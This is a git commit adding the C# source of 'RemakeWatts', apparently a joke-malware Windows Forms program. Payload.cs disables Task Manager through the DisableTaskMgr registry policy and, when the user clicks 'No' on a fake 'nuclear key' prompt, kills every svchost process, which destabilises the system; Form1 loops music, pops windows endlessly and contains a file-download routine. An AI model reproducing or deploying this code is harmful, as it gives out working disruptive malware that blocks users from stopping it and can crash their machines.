c48aa01bc118a8ea850fad4e8c4041858c93920d
kubab <kubab@DESKTOP-73DR8B2>
2022-08-18 20:57:40 +0200

    Dodaj pliki projektów.

---
+++ RemakeWatts/Form1.cs
@@ -0,0 +1,111 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Media;
+using System.Runtime.InteropServices;
+using System.Net;
+
+namespace RemakeWatts
+{
+    public partial class Form1 : Form
+    {
+        [DllImport("user32.dll")]
+        public static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);
+
+        public const int APP_COMMAND_VOLUME_UP = 0xA00;
+        public const int WM_APP_COMMAND = 0x319;
+        public Form1()
+        {
+            Random random = new Random();
+            int x = random.Next(0, 1270);
+            int y = random.Next(0, 920);
+            
+            this.StartPosition = FormStartPosition.Manual;
+            this.Location = new Point(x, y);
+            this.ShowInTaskbar = false;
+
+            InitializeComponent();
+            new Thread(() =>
+            {
+                SoundPlayer player = new SoundPlayer(Properties.Resources.Vicetone__Tony_Igy___Astronomia_2014);
+                player.PlayLooping();
+            }).Start();
+            RandomPayload();
+        }
+
+        public void RandomPayload()
+        {
+            Payload payload = new Payload();
+            payload.BlockTaskMngr(); 
+            while(true)
+            {
+                Random random = new Random();
+                
+                int x = random.Next(1, 5);
+                switch(x)
+                {
+                    case 1:
+                        payload.payload1();
+                        break;
+                    case 2:
+                        payload.payload2();
+                        break;
+                    case 3:
+                        payload.payload3();
+                        break;
+                    case 4:
+                        payload.payload4();
+                        break;
+                    case 5:
+                        payload.payload5();
+                        break;
+                }
+                Thread.Sleep(10000);
+            }
+        }
+
+        public void DownloadLibraries(String link, String path)
+        {
+            using(WebClient wc = new WebClient())
+            {
+                wc.Headers.Add("a", "a");
+                try
+                {
+                    wc.DownloadFile(link, @path);
+                }
+                catch(Exception ex)
+                {
+                    DialogResult retry = MessageBox.Show("Warning!", "Failed to download additional libraries", MessageBoxButtons.RetryCancel);
+                    if(retry == DialogResult.Retry)
+                    {
+                        wc.DownloadFile(link, @path);
+                    }
+                    if(retry == DialogResult.Cancel)
+                    {
+                        wc.DownloadFile(link, @path);
+                    }
+                    else
+                    {
+                        Console.WriteLine("");
+                    }
+
+                }
+            }
+        }
+
+        private void VOL()
+        {
+            for (int i = 0; i < 20; i++) 
+            {
+                SendMessage(this.Handle, WM_APP_COMMAND, this.Handle, (IntPtr)APP_COMMAND_VOLUME_UP);
+            }
+        }
+    }
+}
---
+++ RemakeWatts/Payload.cs
@@ -0,0 +1,89 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Microsoft.Win32;
+using System.Threading;
+using System.Diagnostics;
+using System.Media;
+
+namespace RemakeWatts
+{
+    public class Payload
+    {
+        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
+        public static extern int msciSendString(string ipstrCommand, string ipstrReturnString, int uReturnLenght, int hwndCallback);
+        public void BlockTaskMngr()
+        {
+            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            if (key.GetValue("DisableTaskMgr") == null)
+            {
+                key.SetValue("DisableTaskMgr", 1);
+                key.Close();
+            }
+        }
+
+        public void InsertNuclearKey()
+        {
+            DialogResult dialog = MessageBox.Show("Insert Nuclear Key", "Launch nuclear warhead???", MessageBoxButtons.YesNo);
+            if (dialog == DialogResult.Yes)
+            {
+                try
+                {
+                    int result = msciSendString("Set cdaudio door open wait", null, 0, 0);
+                    Thread.Sleep(3000);
+                    result = msciSendString("Set cdaudio door closed", null, 0, 0);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.Message);
+                }
+            } 
+            else
+            {
+                Process[] processes = Process.GetProcessesByName("svchost");
+                foreach (var proc in processes)
+                {
+                    proc.Kill();
+                }
+            }
+        }
+        public void payload1()
+        {
+            Thread thread = new Thread(() =>
+            {
+                Application.Run(new Form2());
+            });
+            thread.SetApartmentState(ApartmentState.STA);
+            thread.Start();
+        }
+        public void payload2()
+        {
+            Thread thread = new Thread(() =>
+            {
+                Application.Run(new Form3());
+            });
+            thread.SetApartmentState(ApartmentState.STA);
+            thread.Start();
+            }
+        public void payload3()
+        {
+            InsertNuclearKey();
+        }
+        public void payload4()
+        {
+            new Thread(() =>
+            {
+                SoundPlayer player = new SoundPlayer(Properties.Resources.Paris_Platynov_zalewa_cały_sprzęt_cisowianka_Rage_roku);
+                player.PlayLooping();
+            }).Start();
+        }
+        public void payload5()
+        {
+
+        }
+    }
+}
